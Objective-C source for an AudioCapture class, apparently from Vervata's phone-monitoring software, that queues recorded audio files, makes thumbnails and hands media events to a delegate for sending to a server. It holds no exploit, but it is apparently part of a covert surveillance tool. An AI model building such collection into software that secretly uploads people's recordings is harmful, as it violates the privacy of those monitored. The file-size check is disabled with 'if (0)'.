
/**
 - Project name :  MediaCaptureManager
 - Class name   :  AudioCapture
 - Version      :  1.0  
 - Purpose      :  For MediaCaptureManager Component
 - Copy right   :  14/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AudioCapture.h"
#import "FxSystemEvent.h"

@implementation AudioCapture

/**
 - Method name:initWithEventDelegate:andMediaThumbnailManager
 - Purpose: This method is used initialize AudioCapture class
 - Argument list and description: aEventDelegate (EventDelegate),aMediaThumbnailDelegate(MediaThumbnailManager)
 - Return type and description: (id) AudioCapture instance
 */

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate 
	andMediaThumbnailManager: (id <MediaThumbnailManager>) aMediaThumbnailDelegate {
    if (self = [super init]) {
		mAudioCaptureQueue=[[NSMutableArray alloc]init];
		mEventDelegate=aEventDelegate;
		mMediaThumbnailManager=aMediaThumbnailDelegate;
		mIsBusy=NO;
    }
    return self;
}

/**
 - Method name:addPathToAudioQue:
 - Purpose: This method is used  to add audio path to the queue
 - Argument list and description: aAudioPath (NSString)
 - Return type and description: No Return
*/

- (void) addPathToAudioQueue: (NSString *) aAudioPath {
	DLog (@"Add audioPath:(%@) to the queue",aAudioPath)
	[mAudioCaptureQueue addObject:aAudioPath];
}

/**
 - Method name:processAudioCaptureQueue
 - Purpose: This method is used  to process Audio thumbnail generation
 - Argument list and description: No Argument
 - Return type and description: No Return
 */

- (void) processAudioCaptureQueue {
	if ([mAudioCaptureQueue count] && !mIsBusy) {
		mIsBusy= YES;
		NSString *audioPath=[mAudioCaptureQueue objectAtIndex:0];
		DLog (@"====>processAudioCaptureQueue:%@",audioPath);
		
//		NSFileManager *fileManager = [NSFileManager defaultManager];
//		NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:audioPath error:nil];
//		NSUInteger oneMeg = 1020 * 1024;
//		NSUInteger sizeInMeg = [fileAttributes fileSize] / oneMeg;
//		// Check max file size 10 Mb
//		if (sizeInMeg > 10) {
		if (0) {
			// Create system event if media is too big
			FxSystemEvent *systemEvent=[[FxSystemEvent alloc] init];
			NSString *message = NSLocalizedString(@"kMediaEventTooBigCannotDeliver", @"");
			[systemEvent setMessage:message];
			[systemEvent setSystemEventType:kSystemEventTypeMediaEventMaxSizeReached];
			[systemEvent setDirection:kEventDirectionOut];
			[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
			}
			[systemEvent release];
			
			[self removeProcessedPathFromAudioCaptureQueue];
			mIsBusy = NO;
			[self performSelector:@selector(processAudioCaptureQueue) withObject:nil afterDelay:0.1];
		} else {
			[mMediaThumbnailManager createAudioThumbnail:audioPath delegate:self];
		}
	}
}

/**
 - Method name:removeProcessedPathFromAudioCaptureQueue
 - Purpose: This method is used  to remove processed Audio  
 - Argument list and description: No Argument
 - Return type and description: No Return
*/

- (void) removeProcessedPathFromAudioCaptureQueue {
	if ([mAudioCaptureQueue count]) {
		DLog (@"====>removeProcessedPathFromAudioCaptureQueue")
		[mAudioCaptureQueue removeObjectAtIndex:0];
	}
}

#pragma mark MediaThumbnailManager Delegate Methods

/**
 - Method name:thumbnailCreationDidFinished:mediaInfo:thumbnailPath:
 - Purpose: This method is invoked when thumbnail processig is completed.
 - Argument list and description: aError (NSError),aMedia(MediaInfo ),aPaths(id)
 - Return type and description: No Return
*/

- (void) thumbnailCreationDidFinished: (NSError *) aError
							mediaInfo: (MediaInfo *) aMedia
						thumbnailPath: (id) aPaths {
	
	DLog (@"Audio thumbnail creation completed...");
	DLog (@"\n===================================\n");
	DLog (@"Media Length:%ld",(long)[aMedia mMediaLength]);
	DLog (@"Media Type:%d",[aMedia mMediaInputType]);
	DLog (@"Media Full Path:%@",[aMedia mMediaFullPath]);
	DLog (@"Media Size:%llu",[aMedia mMediaSize]);
	DLog (@"Thumbnail Length:%ld",(long)[aMedia mThumbnailLength]);
	DLog (@"Thumbnail Size:%llu",[aMedia mThumbnailSize]);
	DLog (@"Error Code:%ld",(long)[aError code]);
	DLog (@"Thumbnail Path(s):%@",aPaths);
	DLog (@"\n===================================");
	
	[self removeProcessedPathFromAudioCaptureQueue];
	
	 if ([aError code]==kMediaThumbnailOK || [aError code]==kMediaThumbnailCannotGetThumbnail) {
	     MediaEvent *mediaEvent=[[MediaEvent alloc]init];
	     ThumbnailEvent *tEvent=[[ThumbnailEvent alloc]init];
	     [tEvent setFullPath:(NSString *)aPaths];
		 [tEvent setEventType:kEventTypeAudioThumbnail];	 
		 [tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		 [tEvent setActualSize:[aMedia mMediaSize]];
		 [tEvent setActualDuration:[aMedia mMediaLength]];
		 [mediaEvent addThumbnailEvent:tEvent];
		 [tEvent release];
		 [mediaEvent setFullPath:[aMedia mMediaFullPath]];
		 [mediaEvent setMDuration:[aMedia mMediaLength]];
		 [mediaEvent setEventType:kEventTypeAudio];
	     [mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		 //=============================SEND AUDIO EVENT==============================================
		 if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			 [mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent withObject:self];
			 DLog (@"Send Audio event to the server")
		 }
		 [mediaEvent release];
	 } 
	 else {
		 DLog (@"[aError code] = %ld", (long)[aError code]);
	  }
	mIsBusy=NO;
	[self performSelector:@selector(processAudioCaptureQueue) withObject:nil afterDelay:0.1];						
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[mAudioCaptureQueue release];
	[super dealloc];
}

@end
